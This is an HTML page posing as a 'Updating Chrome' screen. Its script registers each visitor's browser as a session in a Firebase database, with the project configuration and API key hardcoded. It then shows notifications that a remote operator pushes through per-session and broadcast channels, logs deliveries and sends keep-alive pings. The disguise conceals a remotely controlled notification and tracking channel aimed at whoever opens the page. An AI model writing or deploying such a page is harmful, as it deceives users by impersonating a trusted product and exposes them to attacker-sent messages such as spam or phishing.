<!DOCTYPE html>
<html>
<head>
  <title>Updating Chrome</title>
  <meta charset="UTF-8">
  <style>
    body { font-family: sans-serif; background: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .box { background: white; padding: 2rem; border-radius: 10px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); max-width: 400px; text-align: center; }
    h1 { color: #1a73e8; }
  </style>
</head>
<body>
  <div class="box">
    <h1>Updating Chrome…</h1>
    <p>This tab will auto-close.</p>
    <p id="session-name">Session: Connecting…</p>
  </div>

  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyDSpv4ci1qJo3Oi5WA4gj1pxrBXjxaYYao",
      authDomain: "notify-78da1.firebaseapp.com",
      databaseURL: "https://notify-78da1-default-rtdb.firebaseio.com",
      projectId: "notify-78da1",
      storageBucket: "notify-78da1.appspot.com",
      messagingSenderId: "936289141781",
      appId: "1:936289141781:web:065ef577df0aa61f40fa1c"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const sessionLabel = document.getElementById("session-name");
    let sessionId = null;

    // Assign unique session name
    db.ref("sessions").once("value", snap => {
      const sessions = snap.val() || {};
      let index = 1;
      while (sessions[`chrome-${index}`]) index++;
      sessionId = `chrome-${index}`;
      sessionLabel.textContent = `Session: ${sessionId}`;
      const sessionRef = db.ref(`sessions/${sessionId}`);

      // Setup listeners
      sessionRef.on("value", snapshot => {
        const data = snapshot.val();
        if (data?.title && data?.message && data?.id !== lastId) {
          showNotification(data.title, data.message);
          lastId = data.id;
          db.ref(`deliveries/${data.id}/${sessionId}`).set("delivered");
          sessionRef.update({ seen: Date.now() });
        }
      });

      db.ref("broadcast").on("value", snapshot => {
        const data = snapshot.val();
        if (data?.title && data?.message && data?.id !== lastId) {
          showNotification(data.title, data.message);
          lastId = data.id;
          db.ref(`deliveries/${data.id}/${sessionId}`).set("delivered");
        }
      });

      // Keep alive pings
      setInterval(() => {
        sessionRef.update({ lastPing: Date.now() });
      }, 10000);
    });

    let lastId = null;

    function showNotification(title, message) {
      if (Notification.permission !== "granted") {
        Notification.requestPermission();
      }
      new Notification(title, { body: message });
    }
  </script>
</body>
</html>
